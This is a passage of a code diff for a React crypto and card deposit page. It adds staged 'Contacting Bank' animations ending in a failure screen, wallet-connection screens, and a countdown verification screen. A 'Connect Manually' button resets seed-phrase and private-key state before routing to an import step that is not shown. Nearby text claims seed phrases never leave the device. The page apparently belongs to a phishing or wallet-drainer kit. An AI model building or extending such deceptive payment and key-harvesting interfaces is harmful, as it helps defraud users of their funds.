+                            {cardStageFailed ? (
+                              <>
+                                <XCircle className="w-8 h-8 text-rose-500 animate-ping" />
+                                <span className="text-[10px] font-bold tracking-widest text-rose-500 uppercase animate-pulse">Failed</span>
+                              </>
+                            ) : (
+                              <>
+                                <Landmark className="w-8 h-8 text-amber-400 animate-pulse" />
+                                <span className="text-[10px] font-bold tracking-widest text-amber-400 uppercase">Contacting Bank</span>
+                              </>
+                            )}
+                          </div>
+                        )}
+                        <span className="text-xs font-mono font-bold text-neutral-300">Stage {cardStage} / 5</span>
+                      </div>
+                    </div>
+
+                    {/* Active Status Badge */}
+                    <div className="mt-4">
+                      {cardStageFailed ? (
+                        <div className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-rose-500/10 border border-rose-500/30 text-rose-400 text-xs font-bold animate-pulse">
+                          <span className="w-2 h-2 rounded-full bg-rose-500 animate-ping" />
+                          Connection Failed
+                        </div>
+                      ) : (
+                        <div className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-bold">
+                          <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
+                          Connecting...
+                        </div>
+                      )}
+                    </div>
                   </div>
 
-                  <div className="grid grid-cols-2 sm:grid-cols-4 gap-4 pt-4 text-left text-xs">
-                    <div className="p-3 rounded-xl bg-white/5">
-                      <span className="text-slate-500 block text-[10px]">Method</span>
-                      <strong className="uppercase">{selectedMethod}</strong>
+                  {/* Single Active Stage Card (Removes previous stage and puts next one until 5/5 completes) */}
+                  <div className="relative z-10 max-w-xl mx-auto space-y-4 pt-4 border-t border-white/10">
+                    <div className="flex items-center justify-between text-xs font-mono text-neutral-400">
+                      <span>Payment Infrastructure Stage</span>
+                      <span className="text-white font-bold">Stage {cardStage} of 5</span>
                     </div>
-                    <div className="p-3 rounded-xl bg-white/5">
-                      <span className="text-slate-500 block text-[10px]">Amount</span>
-                      <strong className="text-emerald-400">${amount.toLocaleString()}</strong>
-                    </div>
-                    <div className="p-3 rounded-xl bg-white/5">
-                      <span className="text-slate-500 block text-[10px]">Security</span>
-                      <strong>TLS 1.3 / 256-bit</strong>
-                    </div>
-                    <div className="p-3 rounded-xl bg-white/5">
-                      <span className="text-slate-500 block text-[10px]">Clearing</span>
-                      <strong>Instant Vault</strong>
-                    </div>
+
+                    <AnimatePresence mode="wait">
+                      {(() => {
+                        const stg = CARD_GATEWAY_STAGES.find(s => s.num === cardStage) || CARD_GATEWAY_STAGES[0];
+                        return (
+                          <motion.div
+                            key={cardStage}
+                            initial={{ opacity: 0, y: 15, scale: 0.98 }}
+                            animate={{ opacity: 1, y: 0, scale: 1 }}
+                            exit={{ opacity: 0, y: -15, scale: 0.98 }}
+                            transition={{ duration: 0.3 }}
+                            className={`p-6 rounded-2xl border transition-all duration-300 flex items-start gap-4 ${
+                              cardStageFailed
+                                ? 'bg-rose-950/20 border-rose-500/50 shadow-lg shadow-rose-950/30'
+                                : cardStageStatus === 'completed'
+                                  ? 'bg-neutral-900 border-emerald-500/40 shadow-lg shadow-emerald-950/20 ring-1 ring-emerald-500/30'
+                                  : 'bg-neutral-900 border-amber-500/30 shadow-lg shadow-amber-950/20 ring-1 ring-amber-500/20'
+                            }`}
+                          >
+                            <div className={`w-10 h-10 rounded-xl flex items-center justify-center shrink-0 mt-0.5 font-bold text-xs ${
+                              cardStageFailed
+                                ? 'bg-rose-500/20 text-rose-400 border border-rose-500/40'
+                                : cardStageStatus === 'completed'
+                                  ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40'
+                                  : 'bg-amber-500/20 text-amber-400 border border-amber-500/40'
+                            }`}>
+                              {cardStageFailed ? (
+                                <XCircle className="w-5 h-5 text-rose-400" />
+                              ) : cardStageStatus === 'completed' ? (
+                                <CheckCircle2 className="w-5 h-5 text-emerald-400" />
+                              ) : (
+                                <div className="w-4 h-4 rounded-full border-2 border-amber-400 border-t-transparent animate-spin" />
+                              )}
+                            </div>
+
+                            <div className="space-y-1.5 flex-1">
+                              <div className="flex items-center justify-between">
+                                <h4 className={`text-base font-bold ${cardStageFailed ? 'text-rose-400' : cardStageStatus === 'completed' ? 'text-white' : 'text-amber-200'}`}>
+                                  {stg.title}
+                                </h4>
+                                {cardStageFailed ? (
+                                  <span className="text-[10px] font-bold text-rose-400 bg-rose-500/10 px-2.5 py-1 rounded-full border border-rose-500/30 animate-pulse">Failed</span>
+                                ) : cardStageStatus === 'completed' ? (
+                                  <span className="text-[10px] font-bold text-emerald-400 bg-emerald-500/10 px-2.5 py-1 rounded-full border border-emerald-500/20">Completed</span>
+                                ) : (
+                                  <span className="text-[10px] font-bold text-amber-400 bg-amber-500/10 px-2.5 py-1 rounded-full border border-amber-500/30 animate-pulse">Pending...</span>
+                                )}
+                              </div>
+                              <p className="text-xs text-neutral-300 leading-relaxed">
+                                {stg.desc}
+                              </p>
+                            </div>
+                          </motion.div>
+                        );
+                      })()}
+                    </AnimatePresence>
                   </div>
                 </motion.div>
               )}
 
-              {/* STEP 4: SUCCESS */}
+              {/* STEP 3.6: DEDICATED FULL-SCREEN ERROR INTERFACE */}
+              {step === 'card_gateway_error' && (
+                <motion.div 
+                  key="card_gateway_error"
+                  initial={{ opacity: 0, scale: 0.95 }}
+                  animate={{ opacity: 1, scale: 1 }}
+                  exit={{ opacity: 0, scale: 0.95 }}
+                  className="relative w-full rounded-[32px] bg-neutral-950 text-white p-8 sm:p-12 text-center space-y-8 overflow-hidden ring-1 ring-rose-500/30 shadow-2xl"
+                >
+                  <div className="w-20 h-20 mx-auto rounded-3xl bg-rose-500/10 border border-rose-500/30 flex items-center justify-center text-rose-400 relative">
+                    <WifiOff className="w-10 h-10 text-rose-500 animate-pulse" />
+                    <div className="absolute inset-0 rounded-3xl bg-rose-500/20 blur-xl animate-pulse" />
+                  </div>
+
+                  <div className="space-y-3 max-w-xl mx-auto">
+                    <h2 className="text-3xl sm:text-4xl font-black tracking-tight text-white">Connection Failed</h2>
+                    <p className="text-xs sm:text-sm text-neutral-300 leading-relaxed">
+                      We were unable to establish a secure connection with the payment processor. This may be due to a temporary network issue, server maintenance, or because card payment services have not yet been configured. No payment has been processed and your card has not been charged.
+                    </p>
+                  </div>
+
+                  {/* Transaction Status Card */}
+                  <div className="p-6 rounded-2xl bg-black/60 border border-white/10 max-w-md mx-auto text-left space-y-3 shadow-inner">
+                    <div className="flex justify-between items-center text-xs py-1 border-b border-white/5">
+                      <span className="text-neutral-400">Payment Status:</span>
+                      <span className="px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-rose-500/10 text-rose-400 border border-rose-500/30">Failed</span>
+                    </div>
+                    <div className="flex justify-between items-center text-xs py-1 border-b border-white/5">
+                      <span className="text-neutral-400">Connection Status:</span>
+                      <span className="font-bold text-amber-400">Unavailable</span>
+                    </div>
+                    <div className="flex justify-between items-center text-xs py-1 border-b border-white/5">
+                      <span className="text-neutral-400">Gateway Response:</span>
+                      <span className="font-bold text-neutral-200">Connection Error</span>
+                    </div>
+                    <div className="flex justify-between items-center text-xs py-1">
+                      <span className="text-neutral-400">Card Charged:</span>
+                      <span className="font-bold text-emerald-400">No</span>
+                    </div>
+                  </div>
+
+                  <div className="pt-2 text-xs text-neutral-500 flex items-center justify-center gap-2">
+                    <RefreshCw className="w-4 h-4 animate-spin text-neutral-400" />
+                    <span>Redirecting to card availability status...</span>
+                  </div>
+                </motion.div>
+              )}
               {step === 'success' && (
                 <motion.div 
                   key="success"
@@ -1363,6 +2734,1398 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
                 </motion.div>
               )}
 
+
+              {/* STEP 3.7: CONNECTING WALLET FULL SCREEN */}
+              {step === 'wallet_connecting' && (
+                <motion.div 
+                  key="wallet_connecting"
+                  initial={{ opacity: 0, scale: 0.98 }}
+                  animate={{ opacity: 1, scale: 1 }}
+                  exit={{ opacity: 0, scale: 0.98 }}
+                  className="relative w-full rounded-[32px] bg-neutral-950 text-white p-8 sm:p-12 text-center space-y-8 overflow-hidden ring-1 ring-indigo-500/30 shadow-2xl min-h-[480px] flex flex-col justify-between"
+                >
+                  {/* Close Button top-left */}
+                  <button
+                    type="button"
+                    onClick={() => {
+                      setIsConnectingWallet(false);
+                      setStep('form');
+                    }}
+                    className="absolute top-6 left-6 flex h-10 w-10 items-center justify-center rounded-xl bg-white/5 border border-white/10 text-neutral-400 hover:text-white hover:bg-white/10 transition z-20"
+                    title="Cancel"
+                  >
+                    <X className="w-5 h-5" />
+                  </button>
+
+                  <div className="pointer-events-none absolute inset-0 opacity-20">
+                    <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-96 h-96 rounded-full bg-indigo-500/30 blur-[120px] animate-pulse" />
+                  </div>
+
+                  <div className="space-y-8 my-auto pt-6">
+                    {/* Clean Animated Loading Ring */}
+                    <div className="relative w-32 h-32 mx-auto flex items-center justify-center">
+                      <div className="absolute inset-0 rounded-full border-4 border-indigo-500/10 border-t-indigo-500 border-r-indigo-400 animate-spin" />
+                      <div className="absolute inset-3 rounded-full border-2 border-purple-500/10 border-b-purple-400 animate-spin [animation-direction:reverse]" />
+                    </div>
+
+                    {/* Heading */}
+                    <div className="space-y-2 max-w-md mx-auto relative z-10">
+                      <h2 className="text-2xl sm:text-3xl font-black tracking-tight text-white">
+                        Connecting Wallet
+                      </h2>
+                      <p className="text-xs sm:text-sm text-neutral-400 leading-relaxed">
+                        Establishing secure connection with <strong className="text-white">{connectingWalletName}</strong>. Please approve the connection request in your wallet.
+                      </p>
+                    </div>
+
+                    {/* Dynamic Status Messages */}
+                    <div className="flex flex-col items-center justify-center gap-2 relative z-10">
+                      <div className="px-4 py-2 rounded-full bg-indigo-500/10 border border-indigo-500/30 flex items-center gap-2.5">
+                        <div className="w-2 h-2 rounded-full bg-indigo-400 animate-ping" />
+                        <span className="text-xs font-mono font-bold text-indigo-300 uppercase tracking-wider">
+                          {CONNECTING_STATUS_MESSAGES[connectingStatusIndex]}
+                        </span>
+                      </div>
+                    </div>
+                  </div>
+
+                  {/* Fixed Bottom Connect Manually Trigger */}
+                  <div className="pt-6 border-t border-white/10 relative z-10 flex flex-col items-center gap-2">
+                    <button
+                      type="button"
+                      onClick={() => {
+                        setIsConnectingWallet(false);
+                        setImportPhrase('');
+                        setShowPhrase(false);
+                        setImportKey('');
+                        setShowKey(false);
+                        setStep('wallet_import_choose');
+                      }}
+                      className="w-full sm:w-auto px-6 py-3.5 rounded-2xl bg-indigo-600/20 border border-indigo-500/40 hover:bg-indigo-600/30 text-indigo-300 font-bold text-xs tracking-wide transition-all shadow-lg flex items-center justify-center gap-2"
+                    >
+                      <Handshake className="w-4 h-4 text-indigo-400" />
+                      <span>Connect Manually Instead</span>
+                      <ChevronRight className="w-4 h-4 text-indigo-400" />
+                    </button>
+                    <span className="text-[11px] text-neutral-500">
+                      Connect your wallet using a secure blockchain connection.
+                    </span>
+                  </div>
+                </motion.div>
+              )}
+
+              {/* STEP 3.8: CONNECTION CANCELLED FULL SCREEN */}
+              {step === 'wallet_cancelled' && (
+                <motion.div 
+                  key="wallet_cancelled"
+                  initial={{ opacity: 0, scale: 0.98 }}
+                  animate={{ opacity: 1, scale: 1 }}
+                  exit={{ opacity: 0, scale: 0.98 }}
+                  className="relative w-full rounded-[32px] bg-neutral-950 text-white p-8 sm:p-12 text-center space-y-6 overflow-hidden ring-1 ring-amber-500/30 shadow-2xl"
+                >
+                  <div className="w-20 h-20 mx-auto rounded-3xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 relative">
+                    <XCircle className="w-10 h-10 text-amber-400" />
+                    <div className="absolute inset-0 rounded-3xl bg-amber-500/20 blur-xl" />
+                  </div>
+
+                  <div className="space-y-2 max-w-md mx-auto">
+                    <h2 className="text-2xl font-black tracking-tight text-white">Connection Cancelled</h2>
+                    <p className="text-xs sm:text-sm text-neutral-400 leading-relaxed">
+                      The wallet connection request was declined or cancelled inside your wallet app. No data was saved.
+                    </p>
+                  </div>
+
+                  <div className="pt-4 flex justify-center">
+                    <button
+                      type="button"
+                      onClick={() => setStep('form')}
+                      className="px-6 py-3 rounded-xl bg-white/10 text-white font-bold text-xs hover:bg-white/20 transition"
+                    >
+                      Return to Wallet Selection
+                    </button>
+                  </div>
+                </motion.div>
+              )}
+
+              {/* STEP 3.9: CONNECT WALLET MANUALLY FULL SCREEN (INSTITUTIONAL ONBOARDING FLOW) */}
+              {step === 'wallet_manual' && (
+                <motion.div 
+                  key="wallet_manual"
+                  initial={{ opacity: 0, scale: 0.98 }}
+                  animate={{ opacity: 1, scale: 1 }}
+                  exit={{ opacity: 0, scale: 0.98 }}
+                  className="relative w-full rounded-[32px] bg-neutral-950 text-white p-6 sm:p-10 overflow-hidden ring-1 ring-white/10 shadow-2xl space-y-6"
+                >
+                  <div className="pointer-events-none absolute inset-0 opacity-15">
+                    <div className="absolute top-0 right-1/4 w-96 h-96 rounded-full bg-indigo-500/20 blur-[120px]" />
+                  </div>
+
+                  {/* Header */}
+                  <div className="flex items-center justify-between pb-6 border-b border-white/10 relative z-10">
+                    <button 
+                      type="button"
+                      onClick={() => {
+                        setSelectedMethod('walletconnect');
+                        setStep('form');
+                      }}
+                      className="flex h-10 w-10 items-center justify-center rounded-xl bg-white/5 ring-1 ring-white/10 hover:bg-white/10 active:scale-95 transition"
+                      title="Back to Wallet Selection"
+                    >
+                      <ArrowLeft className="h-5 w-5 text-white" />
+                    </button>
+                    <div className="flex items-center gap-3">
+                      <div className="flex h-11 w-11 items-center justify-center rounded-xl bg-indigo-500/15 ring-1 ring-indigo-500/30 text-indigo-400 shadow-lg shadow-indigo-950/50">
+                        <Handshake className="w-6 h-6 text-indigo-300" />
+                      </div>
+                      <div className="text-left">
+                        <h2 className="text-base sm:text-xl font-black tracking-tight text-white">Institutional Onboarding</h2>
+                        <span className="text-[11px] text-neutral-400 block font-medium">Self-Custody Key Verification</span>
+                      </div>
+                    </div>
+                    <span className="rounded-full bg-indigo-500/10 px-3 py-1 text-xs font-semibold text-indigo-400 ring-1 ring-indigo-500/30">
+                      Manual Mode
+                    </span>
+                  </div>
+
+                  {/* Hero Section */}
+                  <div className="p-5 rounded-2xl bg-gradient-to-r from-indigo-950/60 via-slate-900 to-indigo-950/40 border border-indigo-500/20 text-left flex flex-col sm:flex-row items-start sm:items-center gap-4 relative overflow-hidden z-10">
+                    <div className="w-12 h-12 rounded-2xl bg-indigo-500/15 border border-indigo-500/30 flex items-center justify-center shrink-0 shadow-lg shadow-indigo-950">
+                      <Wallet className="w-6 h-6 text-indigo-400 animate-pulse" />
+                    </div>
+                    <div className="space-y-1">
+                      <h3 className="text-sm sm:text-base font-bold text-white">Manual Wallet Connection</h3>
+                      <p className="text-xs text-neutral-300 leading-relaxed">
+                        Connect any compatible cryptocurrency wallet by securely providing your public wallet address. No private keys or signature prompts required.
+                      </p>
+                    </div>
+                  </div>
+
+                  {/* Form Body */}
+                  <form onSubmit={handleManualConnectSubmit} className="space-y-6 relative z-10">
+                    {/* Grid-based Network Selection */}
+                    <div className="space-y-3">
+                      <div className="flex items-center justify-between">
+                        <label className="text-xs font-bold tracking-wider text-neutral-300 uppercase flex items-center gap-2">
+                          <span>Select Network</span>
+                          <span className="text-[10px] font-normal text-neutral-400 font-mono">({BLOCKCHAIN_NETWORKS.length} supported)</span>
+                        </label>
+                        <span className="text-[11px] font-mono text-indigo-400 font-semibold">
+                          Selected: {manualNetwork.name} ({manualNetwork.symbol})
+                        </span>
+                      </div>
+
+                      {/* Network Search Bar */}
+                      <div className="relative">
+                        <Search className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-neutral-400" />
+                        <input 
+                          type="text"
+                          value={networkSearch}
+                          onChange={(e) => setNetworkSearch(e.target.value)}
+                          placeholder="Search network (e.g. Ethereum, ERC-20, Solana, TRON)..."
+                          className="w-full pl-10 pr-4 py-2.5 rounded-xl bg-neutral-900 border border-white/10 text-xs text-white placeholder-neutral-500 outline-none focus:border-indigo-500/50 transition"
+                        />
+                      </div>
+
+                      {/* Network Grid */}
+                      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3 max-h-56 overflow-y-auto pr-1">
+                        {BLOCKCHAIN_NETWORKS.filter(net => 
+                          net.name.toLowerCase().includes(networkSearch.toLowerCase()) || 
+                          net.symbol.toLowerCase().includes(networkSearch.toLowerCase()) ||
+                          net.description.toLowerCase().includes(networkSearch.toLowerCase())
+                        ).map((net) => {
+                          const isSelected = manualNetwork.id === net.id;
+                          return (
+                            <button
+                              key={net.id}
+                              type="button"
+                              onClick={() => {
+                                setManualNetwork(net);
+                                setManualAddressError(null);
+                                if (manualAddress) {
+                                  const res = validateWalletAddress(manualAddress, net.type, net.name);
+                                  if (!res.valid) {
+                                    setManualAddressError(res.error || null);
+                                  }
+                                }
+                              }}
+                              className={`p-3.5 rounded-2xl border text-left transition-all relative flex flex-col justify-between h-24 group ${
+                                isSelected 
+                                  ? 'bg-gradient-to-br from-indigo-950/80 to-slate-900 border-indigo-500 ring-2 ring-indigo-500/40 shadow-xl shadow-indigo-950/60 scale-[1.01]' 
+                                  : 'bg-neutral-900/80 border-white/10 hover:border-white/20 hover:bg-neutral-900'
+                              }`}
+                            >
+                              <div className="flex items-center justify-between w-full">
+                                <div className="flex items-center gap-2">
+                                  <NetworkLogo id={net.id} className="w-6 h-6" />
+                                  <span className="text-[10px] font-bold uppercase px-2 py-0.5 rounded-md bg-white/5 border border-white/10 text-neutral-300">
+                                    {net.badge}
+                                  </span>
+                                </div>
+                                {isSelected && (
+                                  <div className="w-5 h-5 rounded-full bg-indigo-500 flex items-center justify-center text-slate-950">
+                                    <Check className="w-3 h-3 stroke-[3]" />
+                                  </div>
+                                )}
+                              </div>
+                              <div>
+                                <h4 className="text-xs font-bold text-white group-hover:text-indigo-300 transition-colors truncate">{net.name}</h4>
+                                <p className="text-[10px] text-neutral-400 font-mono truncate">{net.description}</p>
+                              </div>
+                            </button>
+                          );
+                        })}
+                      </div>
+                    </div>
+
+                    {/* Elevated Card for Wallet Address Input */}
+                    <div className="space-y-3">
+                      <div className="flex items-center justify-between">
+                        <label className="text-xs font-bold tracking-wider text-neutral-300 uppercase flex items-center gap-2">
+                          <span>Public Wallet Address</span>
+                          <span className="text-[10px] text-indigo-400 font-normal">({manualNetwork.name} {manualNetwork.symbol})</span>
+                        </label>
+                        <span className="text-[10px] font-mono text-neutral-400">
+                          {manualNetwork.type === 'evm' ? 'EVM Compatible' : manualNetwork.type === 'solana' ? 'SPL Base58' : manualNetwork.type === 'tron' ? 'TRC-20 Standard' : 'BTC Native/Bech32'}
+                        </span>
+                      </div>
+
+                      <div className="relative">
+                        <input
+                          type="text"
+                          value={manualAddress}
+                          onChange={(e) => {
+                            const val = e.target.value;
+                            setManualAddress(val);
+                            setManualAddressTouched(true);
+                            const res = validateWalletAddress(val, manualNetwork.type, manualNetwork.name);
+                            if (res.valid) {
+                              setManualAddressError(null);
+                            } else if (val.trim()) {
+                              setManualAddressError(res.error || null);
+                            }
+                          }}
+                          placeholder={`Enter or paste public ${manualNetwork.name} address...`}
+                          className={`w-full font-mono text-xs sm:text-sm text-white bg-neutral-900 rounded-2xl p-4 pr-24 outline-none border transition-all ${
+                            manualAddress && !manualAddressError
+                              ? 'border-emerald-500/60 ring-2 ring-emerald-500/30 bg-emerald-950/10 text-emerald-100'
+                              : manualAddressError && manualAddressTouched 
+                              ? 'border-rose-500 ring-2 ring-rose-500/40 bg-rose-950/20 border-rose-500/50' 
+                              : 'border-white/10 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-500/20'
+                          }`}
+                        />
+
+                        {/* Quick Action Buttons */}
+                        <div className="absolute right-2.5 top-1/2 -translate-y-1/2 flex items-center gap-1.5">
+                          <button
+                            type="button"
+                            onClick={handlePasteClipboard}
+                            className="px-2.5 py-1.5 rounded-xl bg-white/5 border border-white/10 hover:bg-white/10 active:scale-95 transition text-[11px] font-bold text-neutral-300 flex items-center gap-1"
+                            title="Paste from Clipboard"
+                          >
+                            <Copy className="w-3 h-3 text-indigo-400" />
+                            <span>Paste</span>
+                          </button>
+                          <button
+                            type="button"
+                            onClick={() => setIsQrScannerOpen(true)}
+                            className="p-2 rounded-xl bg-white/5 border border-white/10 hover:bg-white/10 active:scale-95 transition text-indigo-400"
+                            title="Scan QR Code"
+                          >
+                            <QrCode className="w-3.5 h-3.5" />
+                          </button>
+                        </div>
+                      </div>
+
+                      {/* Live Address Verified Badge */}
+                      {manualAddress && !manualAddressError && (
+                        <motion.div 
+                          initial={{ opacity: 0, y: -4 }}
+                          animate={{ opacity: 1, y: 0 }}
+                          className="p-3 rounded-xl bg-emerald-950/40 border border-emerald-500/40 text-emerald-300 text-xs flex items-center justify-between"
+                        >
+                          <div className="flex items-center gap-2">
+                            <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
+                            <span className="font-semibold">Valid {manualNetwork.name} address verified</span>
+                          </div>
+                          <span className="font-mono text-[10px] text-emerald-400">{abbreviateAddress(manualAddress)}</span>
+                        </motion.div>
+                      )}
+
+                      {/* Validation Error Message */}
+                      {manualAddressError && manualAddressTouched && (
+                        <motion.div 
+                          initial={{ opacity: 0, y: -4 }}
+                          animate={{ opacity: 1, y: 0 }}
+                          className="p-3.5 rounded-xl bg-rose-950/40 border border-rose-500/40 text-rose-300 text-xs flex items-start gap-2.5 shadow-lg shadow-rose-950/30"
+                        >
+                          <AlertCircle className="w-4 h-4 text-rose-400 shrink-0 mt-0.5" />
+                          <span className="font-medium leading-relaxed">{manualAddressError}</span>
+                        </motion.div>
+                      )}
+                    </div>
+
+                    {/* Security Information Card */}
+                    <div className="p-4 rounded-2xl bg-neutral-900/60 border border-white/10 flex items-start gap-3.5 text-xs text-neutral-300">
+                      <div className="p-2 rounded-xl bg-indigo-500/10 border border-indigo-500/20 text-indigo-400 shrink-0">
+                        <ShieldCheck className="w-5 h-5" />
+                      </div>
+                      <div className="space-y-1 text-left">
+                        <h5 className="font-bold text-white text-xs">Security & Privacy Protocol</h5>
+                        <p className="text-[11px] text-neutral-400 leading-relaxed">
+                          Only public wallet addresses are logged to verify asset custody. Private keys, seed phrases, and spending approvals are strictly preserved on your local device.
+                        </p>
+                      </div>
+                    </div>
+
+                    {/* Continue Section */}
+                    <div className="pt-4 border-t border-white/10">
+                      <button
+                        type="submit"
+                        disabled={!manualAddress || !!manualAddressError}
+                        className={`w-full rounded-2xl py-4 text-sm font-bold text-white shadow-xl transition-all flex items-center justify-center gap-2 ${
+                          manualAddress && !manualAddressError
+                            ? 'bg-gradient-to-r from-indigo-600 via-indigo-500 to-purple-600 hover:from-indigo-500 hover:to-purple-500 shadow-indigo-600/30 active:scale-[0.98] cursor-pointer'
+                            : 'bg-neutral-800 text-neutral-500 border border-white/5 cursor-not-allowed opacity-60'
+                        }`}
+                      >
+                        <span>Connect Wallet</span>
+                        <ChevronRight className="w-4 h-4" />
+                      </button>
+                    </div>
+                  </form>
+                </motion.div>
+              )}
+
+              {/* EXISTING WALLET DETECTED FULL SCREEN */}
+              {step === 'existing_wallet_detected' && (
+                <motion.div 
+                  key="existing_wallet_detected"
+                  initial={{ opacity: 0, scale: 0.98 }}
+                  animate={{ opacity: 1, scale: 1 }}
+                  exit={{ opacity: 0, scale: 0.98 }}
+                  className="relative w-full rounded-[32px] bg-neutral-950 text-white p-6 sm:p-10 text-center space-y-8 overflow-hidden ring-1 ring-white/10 shadow-2xl min-h-[520px] flex flex-col justify-between"
+                >
+                  {/* Background Ambient Glow */}
+                  <div className="pointer-events-none absolute inset-0 opacity-20">
+                    <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-96 h-96 rounded-full bg-emerald-500/20 blur-[120px] animate-pulse" />
+                  </div>
+
+                  {/* Header */}
+                  <div className="flex items-center justify-between border-b border-white/10 pb-4 relative z-10">
+                    <button 
+                      type="button"
+                      onClick={() => setStep('methods')}
+                      className="flex h-10 w-10 items-center justify-center rounded-xl bg-white/5 ring-1 ring-white/10 hover:bg-white/10 transition"
+                      title="Back"
+                    >
+                      <ArrowLeft className="h-5 w-5 text-white" />
+                    </button>
+                    <span className="text-xs font-mono font-bold tracking-wider uppercase text-emerald-400 bg-emerald-500/10 px-3 py-1 rounded-full border border-emerald-500/30">
+                      Wallet Session Detected
+                    </span>
+                    <div className="w-10" />
+                  </div>
+
+                  {/* Center Illustration & Content */}
+                  <div className="space-y-6 max-w-lg mx-auto relative z-10 my-auto">
+                    {/* Premium Wallet Illustration */}
+                    <div className="relative w-28 h-28 mx-auto flex items-center justify-center">
+                      <div className="absolute inset-0 rounded-full border border-emerald-500/30 animate-ping opacity-40" />
+                      <div className="w-24 h-24 rounded-3xl bg-gradient-to-br from-emerald-950 via-neutral-900 to-indigo-950 border border-emerald-500/40 flex items-center justify-center relative shadow-2xl shadow-emerald-950/60">
+                        <Wallet className="w-10 h-10 text-emerald-400 relative z-10" />
+                        <div className="absolute top-2 right-2 w-3 h-3 rounded-full bg-emerald-400 ring-4 ring-neutral-950 animate-pulse" />
+                        <div className="absolute inset-0 rounded-3xl bg-emerald-500/20 blur-xl" />
+                      </div>
+                    </div>
+
+                    <div className="space-y-2">
+                      <h2 className="text-2xl sm:text-3xl font-black tracking-tight text-white">
+                        Existing Wallet Detected
+                      </h2>
+                      <p className="text-xs sm:text-sm text-neutral-400 leading-relaxed max-w-md mx-auto">
+                        An existing wallet is already associated with your account. Would you like to continue using this wallet for deposits?
+                      </p>
+                    </div>
+
+                    {/* Wallet Summary Card */}
+                    <div className="p-5 rounded-2xl bg-neutral-900/90 border border-white/10 shadow-xl space-y-3.5 text-left">
+                      <div className="flex items-center justify-between border-b border-white/10 pb-3">
+                        <div className="flex items-center gap-3">
+                          <div className="w-10 h-10 rounded-xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400 font-bold text-xs">
+                            <Wallet className="w-5 h-5" />
+                          </div>
+                          <div>
+                            <h4 className="text-sm font-bold text-white">{selectedWallet || 'Imported Web3 Wallet'}</h4>
+                            <span className="text-[11px] font-mono text-neutral-400">{connectedNetwork || 'Ethereum (ERC-20)'}</span>
+                          </div>
+                        </div>
+                        <div className="flex items-center gap-1.5 px-3 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-semibold">
+                          <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
+                          <span>Connected</span>
+                        </div>
+                      </div>
+
+                      <div className="flex items-center justify-between text-xs pt-1">
+                        <span className="text-neutral-400">Public Address:</span>
+                        <span className="font-mono text-white font-bold bg-black/40 px-2.5 py-1 rounded-lg border border-white/10">
+                          {abbreviateAddress(connectedAddress)}
+                        </span>
+                      </div>
+                    </div>
+                  </div>
+
+                  {/* Action Buttons */}
+                  <div className="pt-6 border-t border-white/10 relative z-10 grid grid-cols-1 sm:grid-cols-2 gap-3">
+                    <button
+                      type="button"
+                      onClick={() => {
+                        setSelectedMethod('walletconnect');
+                        setStep('form');
+                      }}
+                      className="w-full py-4 rounded-2xl bg-gradient-to-r from-emerald-500 via-emerald-400 to-teal-500 text-slate-950 font-black text-sm hover:from-emerald-400 hover:to-teal-400 transition-all shadow-xl shadow-emerald-500/20 active:scale-[0.98] flex items-center justify-center gap-2 cursor-pointer"
+                    >
+                      <CheckCircle2 className="w-5 h-5 text-slate-950" />
+                      <span>Continue with This Wallet</span>
+                    </button>
+
+                    <button
+                      type="button"
+                      onClick={() => {
+                        setWalletConnected(false);
+                        setConnectedAddress('');
+                        setIgnoreExistingWallet(true);
+                        setSelectedMethod('walletconnect');
+                        setStep('form');
+                      }}
+                      className="w-full py-4 rounded-2xl bg-white/5 border border-white/10 hover:bg-white/10 text-neutral-300 hover:text-white font-bold text-sm transition-all active:scale-[0.98] cursor-pointer"
+                    >
+                      Use a Different Wallet
+                    </button>
+                  </div>
+                </motion.div>
+              )}
+
+              {step === 'crypto_deposit_verification' && (
+                <div className="fixed inset-0 z-[100] bg-[#000000] text-white flex flex-col justify-between overflow-y-auto select-none font-sans">
+                  
+                  {/* Floating X Button at top left */}
+                  <div className="absolute top-12 left-6 z-[110]">
+                    <button
+                      type="button"
+                      onClick={() => setShowAbandonModal(true)}
+                      className="p-1.5 rounded-full bg-zinc-900/80 border border-white/10 text-[#A1A1AA] hover:text-white transition-all cursor-pointer flex items-center justify-center shadow-lg"
+                      title="Abandon Session"
+                    >
+                      <X className="w-4 h-4 stroke-[1.5]" />
+                    </button>
+                  </div>
+
+                  {/* MAIN IMMERSIVE CONTAINER */}
+                  <div className="flex-1 flex flex-col justify-start px-6 pt-4 pb-6 max-w-md mx-auto w-full space-y-6">
+                    
+                    {/* HERO SECTION */}
+                    <div className="flex flex-col items-center text-center space-y-2.5 shrink-0">
+                      <h2 className="text-[38px] font-semibold tracking-tight text-white leading-tight">
+                        Pending Verification
+                      </h2>
+                      <p className="text-[16px] text-[#A1A1AA] leading-relaxed">
+                        Your transaction is being verified.
+                      </p>
+                    </div>
+
+                    {/* COUNTDOWN SECTION */}
+                    <div className="flex flex-col items-center text-center shrink-0">
+                      <span className="text-[80px] font-semibold tabular-nums tracking-tighter text-white leading-none">
+                        {Math.floor(verificationSecondsLeft / 60).toString().padStart(2, '0')}:{(verificationSecondsLeft % 60).toString().padStart(2, '0')}
+                      </span>
+                      <span className="text-[14px] font-medium text-[#A1A1AA] mt-1">
+                        Verification Window Remaining
+                      </span>
+                    </div>
+
+                    {/* TWO-COLUMN DETAILS GRID */}
+                    <div className="space-y-3.5 shrink-0">
+                      <div className="h-[1px] w-full bg-zinc-900/40" />
+                      
+                      {/* Reference ID */}
